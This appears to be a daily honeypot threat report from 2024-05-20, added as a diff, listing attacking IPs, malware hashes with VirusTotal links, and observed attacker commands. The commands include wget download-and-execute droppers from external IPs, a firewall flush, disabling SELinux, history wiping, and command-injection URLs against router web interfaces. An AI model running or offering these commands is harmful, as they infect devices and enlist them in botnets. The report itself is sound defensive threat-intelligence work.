@@ -1,0 +1,67 @@
+Top 5 IPs for 2024-05-20 :
+
+58.106.144.6
+218.92.0.96
+39.90.147.149
+14.155.205.58
+96.27.207.57
+
+Malware Observed:
+
+File name: eyshcjdmzg
+ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+https://www.virustotal.com/gui/file/ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+File name: sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+Downloaded from: http://37.34.204.139:1418/.i
+d5601202dff3017db238145ff21857415f663031aca9b3d534bec8991b12179a
+https://www.virustotal.com/gui/file/d5601202dff3017db238145ff21857415f663031aca9b3d534bec8991b12179a
+95cdf53dfda4bc0fefec0fea0c77fe49ee79a957732e0565360fae6050967d65
+https://www.virustotal.com/gui/file/95cdf53dfda4bc0fefec0fea0c77fe49ee79a957732e0565360fae6050967d65
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Commands/exploits observed:
+
+pkill -f M
+pkill -f arm7
+pkill -f arm
+pkill -f x86
+pkill -f x86_64
+su 0 pkill -f M
+su 0 pkill -f arm7
+su 0 pkill -f arm
+su 0 pkill -f x86
+su 0 pkill -f x86_64
+su 0 iptables -F
+su 0 setenforce 0
+su 0 busybox wget http://103.228.37.56/a -O /data/local/tmp/a; su 0 chmod +x /data/local/tmp/a && su 0 sh /data/local/tmp/a
+busybox wget http://103.228.37.56/a; chmod 777 a;sh a
+busybox wget http://103.228.37.56/most-arm; chmod 777 most-arm; ./most-arm android.exploit
+busybox wget http://103.228.37.56/most-arm5; chmod 777 most-arm5; ./most-arm5 android.exploit
+busybox wget http://103.228.37.56/most-arm6; chmod 777 most-arm6; ./most-arm6 android.exploit
+busybox wget http://103.228.37.56/most-arm7; chmod 777 most-arm7; ./most-arm7 android.exploit
+busybox wget http://103.228.37.56/most-m68k; chmod 777 most-m68k; ./most-m68k android.exploit
+busybox wget http://103.228.37.56/most-mips; chmod 777 most-mips; ./most-mips android.exploit
+busybox wget http://103.228.37.56/most-mpsl; chmod 777 most-mpsl; ./most-mpsl android.exploit
+busybox wget http://103.228.37.56/most-ppc; chmod 777 most-ppc; ./most-ppc android.exploit
+busybox wget http://103.228.37.56/most-sh4; chmod 777 most-sh4; ./most
+
+
+CMD: #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c; 
+
+
+
+/shell?cd+/tmp;rm+-rf+*;wget+45.128.232.15/jaws;sh+/tmp/jaws
+
+/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.15.222.150%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
